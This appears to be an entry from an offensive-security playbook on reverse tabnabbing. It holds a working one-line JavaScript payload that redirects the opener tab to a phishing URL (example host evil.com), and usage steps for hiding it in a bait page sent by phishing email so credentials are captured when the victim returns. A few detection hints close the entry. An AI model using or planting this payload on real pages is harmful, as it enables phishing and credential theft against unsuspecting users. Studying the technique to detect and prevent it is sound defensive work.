---
id: 9b302fce-45a8-4f81-99e0-b28c15ab1862
name: JavaScript-Tabnabbing-Window-Opener-Redirect
type: code
language: javascript
verified: true
created_at: '2023-04-06T03:56:40.534332+00:00'
updated_at: '2023-04-06T03:56:40.549324+00:00'
platforms:
  - Browser
tags:
  - phishing
  - tabnabbing
  - javascript
validated: true
---

# JavaScript-Tabnabbing-Window-Opener-Redirect

## Code

```javascript
window.opener.location = "http://$_PHISH_URL";
```

## Description

This JavaScript snippet performs a tabnabbing redirect by changing the location of the window that opened the current page (opener) to a attacker-controlled phishing URL. It executes immediately when the bait page loads in a new tab, altering the victim's original tab without their immediate notice.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_PHISH_URL | Full URL of the phishing login page | http://evil.com/phish.html |

## Usage

Embed this script in an HTML bait page linked via phishing email. Instruct or trick the victim to open the link in a new tab while viewing a legitimate site. The script runs on load, redirecting the original tab to capture credentials when the victim returns to it.

## Detection

- Browser developer tools or network logs showing window.opener manipulations.
- JavaScript execution monitoring for location changes in opened tabs.
- Endpoint protection alerting on cross-tab redirects or anomalous script loads from untrusted domains.

## Related

- [[procedures/Tabnabbing-Phishing-Redirect-Attack]]
- [[commands/create-tabnabbing-bait-html]]
